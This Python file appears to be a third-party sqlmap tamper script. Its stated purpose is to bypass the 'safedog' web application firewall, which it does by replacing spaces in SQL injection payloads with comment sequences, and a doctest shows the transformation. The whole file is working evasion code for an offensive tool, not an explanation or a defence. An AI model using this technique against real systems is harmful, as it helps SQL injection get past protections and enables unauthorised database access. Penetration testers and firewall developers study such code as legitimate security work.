#!/usr/bin/env python
"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
v 0.0.1 
2016.08.21
"""
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass
	
def tamper(payload, **kwargs):
    """
	To bypass safedog 
    Replaces space character (' ') with plus ('/*|%20--%20|*/')
    >>> tamper('SELECT id FROM users')
    'SELECT/*|%20--%20|*/id/*|%20--%20|*/FROM/*|%20--%20|*/users'
    """
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False
        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/*|%20--%20|*/"
                    continue
            elif payload[i] == '\'':
                quote = not quote
            elif payload[i] == '"':
                doublequote = not doublequote
            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/*|%20--%20|*/"
                continue
            retVal += payload[i]
    return retVal
